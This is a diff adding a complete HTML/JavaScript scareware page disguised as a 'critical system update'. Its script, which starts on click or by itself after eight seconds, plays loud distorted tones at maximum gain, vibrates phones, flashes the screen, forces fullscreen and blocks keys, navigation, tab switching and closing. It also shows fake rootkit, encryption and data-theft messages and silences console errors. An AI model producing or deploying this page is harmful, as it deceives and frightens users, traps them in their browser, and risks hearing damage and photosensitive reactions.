@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SYSTEM UPDATE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+            touch-action: none;
+        }
+        
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            cursor: none !important;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+        
+        .fake-update {
+            text-align: center;
+            padding: 20px;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .progress-bar {
+            width: 90%;
+            height: 40px;
+            background: #111;
+            margin: 30px auto;
+            border-radius: 3px;
+            overflow: hidden;
+            border: 3px solid #0f0;
+            box-shadow: 0 0 30px #0f0;
+        }
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, #0f0, #0ff, #f0f, #0f0);
+            width: 0%;
+            animation: progress 3s linear infinite;
+            filter: brightness(1.5);
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            50% { width: 100%; }
+            100% { width: 0%; }
+        }
+        
+        .warning {
+            color: #f00;
+            font-size: 16px;
+            margin-top: 25px;
+            text-shadow: 0 0 15px #f00;
+            animation: blink 0.3s infinite;
+            font-weight: bold;
+            display: none;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        #initButton {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            color: #f00;
+            border: none;
+            font-size: 28px;
+            z-index: 10000;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            line-height: 1.5;
+            font-weight: bold;
+            text-shadow: 0 0 20px #f00;
+        }
+        
+        .critical-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            color: #f00;
+            z-index: 99999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-size: 32px;
+            text-align: center;
+            display: none;
+            animation: redPulse 0.5s infinite;
+        }
+        
+        @keyframes redPulse {
+            0%, 100% { background-color: #000; }
+            50% { background-color: #300; }
+        }
+        
+        .volume-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 255, 0, 0.9);
+            z-index: 9998;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            font-size: 36px;
+            color: #000;
+            font-weight: bold;
+            text-align: center;
+            animation: flashGreen 0.2s infinite;
+        }
+        
+        @keyframes flashGreen {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        .block-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9997;
+            display: none;
+        }
+        
+        .system-stats {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            font-size: 12px;
+            color: #0f0;
+            text-align: left;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 10px;
+            border: 1px solid #0f0;
+        }
+    </style>
+</head>
+<body>
+
+<button id="initButton">
+    ⚠️ CRITICAL SYSTEM UPDATE REQUIRED ⚠️<br><br>
+    CLICK ANYWHERE TO START<br><br>
+    <span style="font-size: 18px; color: #0f0;">DO NOT INTERRUPT - SYSTEM MAY BECOME UNRESPONSIVE</span>
+</button>
+
+<div class="volume-overlay" id="volumeOverlay">
+    ⬆️ MAXIMUM VOLUME REQUIRED ⬆️<br>
+    <span style="font-size: 24px;">Set volume to 100% for update verification</span>
+</div>
+
+<div class="critical-overlay" id="criticalOverlay">
+    <div style="margin-bottom: 30px;">🚨 CRITICAL SYSTEM FAILURE 🚨</div>
+    <div id="errorText" style="font-size: 24px; margin: 20px; color: #0ff;"></div>
+    <div style="font-size: 18px; margin-top: 30px; color: #f00;">
+        DO NOT POWER OFF - EMERGENCY REPAIR IN PROGRESS
+    </div>
+</div>
+
+<div class="block-overlay" id="blockOverlay"></div>
+
+<div class="fake-update">
+    <h1 style="font-size: 2.5em; margin-bottom: 25px; text-shadow: 0 0 25px #0f0; animation: glow 2s infinite;">🔧 SYSTEM INTEGRITY UPDATE</h1>
+    <p style="font-size: 1.4em; margin-bottom: 10px;">CRITICAL SECURITY PATCH IN PROGRESS...</p>
+    <p style="color: #ff0; font-weight: bold; margin: 15px 0; font-size: 1.2em; text-shadow: 0 0 10px #ff0;">
+        ⚠️ DO NOT TOUCH SCREEN OR INTERRUPT ⚠️
+    </p>
+    
+    <div class="progress-bar">
+        <div class="progress"></div>
+    </div>
+    
+    <p id="status" style="margin: 25px 0; min-height: 40px; font-size: 1.3em;">INITIALIZING SYSTEM SCAN...</p>
+    <div class="warning" id="warningText">⚠ SYSTEM INTEGRITY COMPROMISED ⚠</div>
+    
+    <div class="system-stats">
+        <div>CPU: ████████████████████ 100%</div>
+        <div>RAM: ████████████████████ 98%</div>
+        <div>TEMP: ████████████████████ 127°C</div>
+        <div>NET: DATA EXFILTRATION ACTIVE</div>
+        <div>AUDIO: MAX VOLUME LOCKED</div>
+    </div>
+</div>
+
+<script>
+// ======================
+// ULTIMATE SYSTEM LOCK v4.0
+// MAX VOLUME + SCREEN LOCK
+// ======================
+
+let chaosActive = false;
+let audioContext;
+let oscillators = [];
+let masterGain;
+let maxVolumeForced = false;
+let screenLockAttempts = 0;
+const MAX_SCREEN_LOCK_ATTEMPTS = 10;
+
+// EXTREME FREQUENCIES FOR MAX ANNOYANCE
+const FREQUENCIES = [85, 210, 440, 880, 1760, 3520, 7040];
+const WAVE_TYPES = ['square', 'sawtooth', 'triangle'];
+
+// SYSTEM MESSAGES
+const STATUS_MSGS = [
+    "SCANNING SYSTEM FILES...",
+    "ANALYZING SECURITY BREACHES...",
+    "DOWNLOADING CRITICAL UPDATE...",
+    "INSTALLING ROOTKIT COMPONENTS...",
+    "OVERRIDING SECURITY PROTOCOLS...",
+    "ENCRYPTING USER DATA...",
+    "EXFILTRATING SENSITIVE INFORMATION...",
+    "DISABLING SAFETY CONTROLS...",
+    "MAXIMIZING AUDIO OUTPUT...",
+    "LOCKING SCREEN ORIENTATION...",
+    "DISABLING HARDWARE BUTTONS...",
+    "INITIATING PERMANENT LOCK...",
+    "SYSTEM COMPROMISE: 98% COMPLETE..."
+];
+
+const ERROR_MSGS = [
+    "FATAL: AUDIO DRIVER OVERLOAD",
+    "CRITICAL: SCREEN LOCK FAILURE",
+    "EMERGENCY: VOLUME CONTROL HIJACKED",
+    "WARNING: HARDWARE MALFUNCTION",
+    "ALERT: SYSTEM PERMANENTLY ALTERED",
+    "ERROR: RECOVERY MODE DISABLED",
+    "FAILURE: EXIT SEQUENCE BLOCKED"
+];
+
+// INITIALIZE CHAOS ENGINE
+document.getElementById('initButton').onclick = function() {
+    if (chaosActive) return;
+    
+    this.style.display = 'none';
+    chaosActive = true;
+    
+    // STEP 1: FORCE MAX VOLUME VISUAL
+    showVolumeDemand();
+    
+    // STEP 2: START AUDIO TORTURE
+    setTimeout(initAudioTorture, 1000);
+    
+    // STEP 3: LOCK SCREEN COMPLETELY
+    setTimeout(lockScreenCompletely, 2000);
+    
+    // STEP 4: START SYSTEM SIMULATION
+    startSystemSimulation();
+    
+    // STEP 5: PREVENT ALL ESCAPES
+    setupEscapePrevention();
+    
+    console.log("SYSTEM LOCK ENGAGED");
+};
+
+// VOLUME DEMAND OVERLAY
+function showVolumeDemand() {
+    const overlay = document.getElementById('volumeOverlay');
+    overlay.style.display = 'flex';
+    
+    // FLASH INTENSELY
+    let flashCount = 0;
+    const flashInterval = setInterval(() => {
+        overlay.style.backgroundColor = flashCount % 2 === 0 ? '#0f0' : '#000';
+        flashCount++;
+        
+        if (flashCount > 10) {
+            clearInterval(flashInterval);
+            overlay.style.display = 'none';
+            maxVolumeForced = true;
+        }
+    }, 200);
+}
+
+// EXTREME AUDIO TORTURE SYSTEM
+function initAudioTorture() {
+    try {
+        // CREATE AUDIO CONTEXT WITH MAX VOLUME
+        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        
+        // CREATE MASTER GAIN AT MAXIMUM
+        masterGain = audioContext.createGain();
+        masterGain.gain.setValueAtTime(1.0, audioContext.currentTime); // MAX VOLUME
+        masterGain.connect(audioContext.destination);
+        
+        // CREATE MULTIPLE EXTREME OSCILLATORS
+        for (let i = 0; i < 7; i++) {
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator.type = WAVE_TYPES[i % WAVE_TYPES.length];
+            oscillator.frequency.setValueAtTime(FREQUENCIES[i], audioContext.currentTime);
+            
+            // MAXIMUM GAIN FOR EACH OSCILLATOR
+            gainNode.gain.setValueAtTime(0.7, audioContext.currentTime);
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(masterGain);
+            
+            oscillator.start();
+            oscillators.push({ oscillator, gainNode });
+            
+            // ADD FREQUENCY SWEEP FOR EXTRA ANNOYANCE
+            if (i % 2 === 0) {
+                oscillator.frequency.exponentialRampToValueAtTime(
+                    FREQUENCIES[i] * 4,
+                    audioContext.currentTime + 0.5
+                );
+            }
+        }
+        
+        // CREATE PULSING LOW FREQUENCY FOR VIBRATION EFFECT
+        const lfo = audioContext.createOscillator();
+        const lfoGain = audioContext.createGain();
+        lfo.type = 'sine';
+        lfo.frequency.setValueAtTime(5, audioContext.currentTime); // 5Hz pulse
+        lfoGain.gain.setValueAtTime(0.3, audioContext.currentTime);
+        lfo.connect(lfoGain);
+        lfoGain.connect(masterGain);
+        lfo.start();
+        
+        // DYNAMIC MODULATION FOR MAXIMUM ANNOYANCE
+        setInterval(() => {
+            oscillators.forEach((osc, idx) => {
+                // RANDOM FREQUENCY JUMPS
+                const newFreq = FREQUENCIES[idx] * (0.5 + Math.random());
+                osc.oscillator.frequency.setValueAtTime(
+                    newFreq,
+                    audioContext.currentTime
+                );
+                
+                // RANDOM GAIN PULSES
+                osc.gainNode.gain.setValueAtTime(
+                    0.3 + Math.random() * 0.7,
+                    audioContext.currentTime
+                );
+                
+                // OCCASIONAL EXTREME BURSTS
+                if (Math.random() > 0.9) {
+                    osc.gainNode.gain.setValueAtTime(1.0, audioContext.currentTime);
+                    setTimeout(() => {
+                        osc.gainNode.gain.setValueAtTime(0.5, audioContext.currentTime);
+                    }, 100);
+                }
+            });
+            
+            // OCCASIONALLY MAX OUT MASTER VOLUME
+            if (Math.random() > 0.8) {
+                masterGain.gain.setValueAtTime(1.0, audioContext.currentTime);
+            }
+        }, 150);
+        
+    } catch (e) {
+        console.error("Audio init failed:", e);
+        // FALLBACK: USE HTML5 AUDIO WITH MAX VOLUME
+        createFallbackAudio();
+    }
+    
+    // MOBILE VIBRATION PATTERN (CONTINUOUS)
+    if (navigator.vibrate && 'vibrate' in navigator) {
+        setInterval(() => {
+            // INTENSE VIBRATION PATTERN
+            navigator.vibrate([1000, 200, 800, 200, 600, 100, 400]);
+        }, 3000);
+    }
+}
+
+// HTML5 AUDIO FALLBACK
+function createFallbackAudio() {
+    const audio = new Audio();
+    audio.loop = true;
+    audio.volume = 1.0; // MAX VOLUME
+    
+    // CREATE DYNAMIC AUDIO CONTEXT FOR FALLBACK
+    const fallbackContext = new (window.AudioContext || window.webkitAudioContext)();
+    const source = fallbackContext.createMediaElementSource(audio);
+    const gainNode = fallbackContext.createGain();
+    
+    gainNode.gain.setValueAtTime(1.0, fallbackContext.currentTime);
+    source.connect(gainNode);
+    gainNode.connect(fallbackContext.destination);
+    
+    // USE OSCILLATOR SIMULATION VIA SCRIPT PROCESSOR
+    const processor = fallbackContext.createScriptProcessor(4096, 1, 1);
+    processor.onaudioprocess = function(e) {
+        const output = e.outputBuffer.getChannelData(0);
+        const frequency = 440;
+        
+        for (let i = 0; i < output.length; i++) {
+            // GENERATE MULTIPLE FREQUENCIES
+            output[i] = 0.3 * Math.sin(2 * Math.PI * frequency * i / 44100) +
+                        0.2 * Math.sin(2 * Math.PI * frequency * 2 * i / 44100) +
+                        0.2 * Math.sin(2 * Math.PI * frequency * 0.5 * i / 44100) +
+                        0.1 * Math.random(); // ADD NOISE
+        }
+    };
+    
+    gainNode.connect(processor);
+    processor.connect(fallbackContext.destination);
+    
+    // START PLAYBACK
+    audio.play().catch(e => {
+        console.log("Fallback audio failed:", e);
+    });
+}
+
+// SCREEN LOCK SYSTEM
+function lockScreenCompletely() {
+    // FULLSCREEN REQUEST
+    const elem = document.documentElement;
+    
+    function attemptFullscreen() {
+        if (screenLockAttempts >= MAX_SCREEN_LOCK_ATTEMPTS) return;
+        
+        if (elem.requestFullscreen) {
+            elem.requestFullscreen().catch(() => {
+                setTimeout(attemptFullscreen, 500);
+            });
+        } else if (elem.webkitRequestFullscreen) {
+            elem.webkitRequestFullscreen();
+        } else if (elem.msRequestFullscreen) {
+            elem.msRequestFullscreen();
+        }
+        
+        screenLockAttempts++;
+    }
+    
+    attemptFullscreen();
+    
+    // SCREEN ORIENTATION LOCK (MOBILE)
+    if (screen.orientation && screen.orientation.lock) {
+        screen.orientation.lock('portrait').catch(() => {
+            screen.orientation.lock('landscape').catch(() => {});
+        });
+    }
+    
+    // BLOCK OVERLAY TO PREVENT TOUCH
+    const blockOverlay = document.getElementById('blockOverlay');
+    blockOverlay.style.display = 'block';
+    
+    // MAKE OVERLAY RESPONSIVE BUT NON-INTERACTIVE
+    blockOverlay.onclick = blockOverlay.ontouchstart = function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        triggerCriticalError("ILLEGAL TOUCH DETECTED");
+        return false;
+    };
+    
+    // PERIODIC FULLSCREEN RE-ENFORCEMENT
+    setInterval(() => {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+            attemptFullscreen();
+        }
+    }, 1000);
+}
+
+// SYSTEM SIMULATION
+function startSystemSimulation() {
+    let statusIndex = 0;
+    let warningVisible = false;
+    
+    // UPDATE STATUS
+    setInterval(() => {
+        document.getElementById('status').textContent = STATUS_MSGS[statusIndex];
+        statusIndex = (statusIndex + 1) % STATUS_MSGS.length;
+        
+        // RANDOM WARNINGS
+        if (Math.random() > 0.6 && !warningVisible) {
+            const warning = document.getElementById('warningText');
+            warning.textContent = "⚠ " + ERROR_MSGS[Math.floor(Math.random() * ERROR_MSGS.length)] + " ⚠";
+            warning.style.display = 'block';
+            warningVisible = true;
+            
+            setTimeout(() => {
+                warning.style.display = 'none';
+                warningVisible = false;
+            }, 2000);
+        }
+        
+        // OCCASIONAL CRITICAL ERROR
+        if (Math.random() > 0.9) {
+            setTimeout(() => {
+                triggerCriticalError();
+            }, 500);
+        }
+    }, 1500);
+    
+    // PROGRESS BAR RESET
+    const progressBar = document.querySelector('.progress');
+    setInterval(() => {
+        progressBar.style.animation = 'none';
+        void progressBar.offsetWidth; // Trigger reflow
+        progressBar.style.animation = 'progress 3s linear infinite';
+    }, 3000);
+}
+
+// CRITICAL ERROR DISPLAY
+function triggerCriticalError(customMsg) {
+    const overlay = document.getElementById('criticalOverlay');
+    const errorText = document.getElementById('errorText');
+    
+    errorText.textContent = customMsg || ERROR_MSGS[Math.floor(Math.random() * ERROR_MSGS.length)];
+    overlay.style.display = 'flex';
+    
+    // MAXIMIZE AUDIO DURING ERROR
+    if (masterGain) {
+        masterGain.gain.setValueAtTime(1.0, audioContext.currentTime);
+    }
+    
+    // FLASHING EFFECT
+    let flashCount = 0;
+    const flashInterval = setInterval(() => {
+        overlay.style.backgroundColor = flashCount % 2 === 0 ? '#f00' : '#000';
+        flashCount++;
+        
+        if (flashCount > 8) {
+            clearInterval(flashInterval);
+            setTimeout(() => {
+                overlay.style.display = 'none';
+            }, 2000);
+        }
+    }, 250);
+}
+
+// ESCAPE PREVENTION SYSTEM
+function setupEscapePrevention() {
+    // BLOCK ALL KEYS
+    document.onkeydown = function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        
+        // SPECIAL HANDLING FOR ESCAPE KEYS
+        const blockedKeys = ['Escape', 'F11', 'F12', 'Tab', 'Alt', 'Control', 'Meta'];
+        const keyCombos = [
+            { key: 'w', ctrl: true },
+            { key: 't', ctrl: true },
+            { key: 'n', ctrl: true },
+            { key: 'F4', alt: true }
+        ];
+        
+        // CHECK SINGLE KEYS
+        if (blockedKeys.includes(e.key)) {
+            triggerCriticalError("ESCAPE ATTEMPT BLOCKED: " + e.key);
+        }
+        
+        // CHECK COMBINATIONS
+        keyCombos.forEach(combo => {
+            if (e.key === combo.key && 
+                ((combo.ctrl && e.ctrlKey) || (combo.alt && e.altKey))) {
+                triggerCriticalError("KEYBOARD SHORTCUT DISABLED");
+            }
+        });
+        
+        return false;
+    };
+    
+    // BLOCK RIGHT CLICK
+    document.oncontextmenu = function(e) {
+        e.preventDefault();
+        triggerCriticalError("CONTEXT MENU DISABLED");
+        return false;
+    };
+    
+    // PREVENT PAGE UNLOAD
+    window.onbeforeunload = function(e) {
+        e.preventDefault();
+        
+        // TRY TO RE-OPEN PAGE
+        setTimeout(() => {
+            window.location.href = window.location.href;
+        }, 100);
+        
+        triggerCriticalError("PAGE CLOSURE ATTEMPTED");
+        return "SYSTEM UPDATE IN PROGRESS - DO NOT CLOSE";
+    };
+    
+    // DETECT TAB SWITCHING
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            // TAB IS HIDDEN - BRING IT BACK
+            window.focus();
+            
+            // OPEN NEW TAB WITH SAME CONTENT
+            const newWindow = window.open(window.location.href, '_blank');
+            if (newWindow) {
+                window.focus();
+            }
+            
+            triggerCriticalError("TAB SWITCH DETECTED");
+        }
+    });
+    
+    // BLOCK BACK BUTTON
+    history.pushState(null, null, document.URL);
+    window.addEventListener('popstate', function() {
+        history.pushState(null, null, document.URL);
+        triggerCriticalError("BACK NAVIGATION BLOCKED");
+    });
+    
+    // PERIODIC "KEEP ALIVE" PULSE
+    setInterval(() => {
+        if (audioContext && audioContext.state === 'suspended') {
+            audioContext.resume();
+        }
+        
+        // RE-FOCUS WINDOW
+        window.focus();
+        
+        // OCCASIONAL AUTO-REFRESH TO PREVENT CLOSURE
+        if (Math.random() > 0.95) {
+            setTimeout(() => {
+                location.reload();
+            }, 1000);
+        }
+    }, 3000);
+}
+
+// MOBILE SPECIFIC ENHANCEMENTS
+if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+    // DISABLE ALL TOUCH GESTURES
+    document.addEventListener('touchstart', function(e) {
+        if (chaosActive) {
+            e.preventDefault();
+            e.stopPropagation();
+            
+            // VIBRATE ON TOUCH
+            if (navigator.vibrate) {
+                navigator.vibrate([200, 100, 200]);
+            }
+            
+            triggerCriticalError("SCREEN TOUCH REJECTED");
+        }
+    }, { passive: false });
+    
+    document.addEventListener('touchmove', function(e) {
+        if (chaosActive) {
+            e.preventDefault();
+            e.stopPropagation();
+        }
+    }, { passive: false });
+    
+    // DISABLE ZOOM
+    document.addEventListener('gesturestart', function(e) {
+        e.preventDefault();
+    });
+    
+    // DISABLE PHYSICAL BUTTONS VIA VISUAL OVERLAY
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            // PHONE BUTTON PRESSED - TRAP USER
+            setTimeout(() => {
+                window.location.href = 'about:blank';
+                setTimeout(() => {
+                    window.history.go(-1);
+                }, 100);
+            }, 50);
+        }
+    });
+}
+
+// AUTO-START SAFETY (IF USER DOESN'T CLICK)
+setTimeout(() => {
+    if (!chaosActive) {
+        document.getElementById('initButton').style.display = 'none';
+        chaosActive = true;
+        showVolumeDemand();
+        setTimeout(initAudioTorture, 800);
+        setTimeout(lockScreenCompletely, 1500);
+        startSystemSimulation();
+        setupEscapePrevention();
+    }
+}, 8000);
+
+
+console.log = console.warn = console.error = function() {};
+window.onerror = function() { return true; };
+
+</script>
+</body>
+</html>
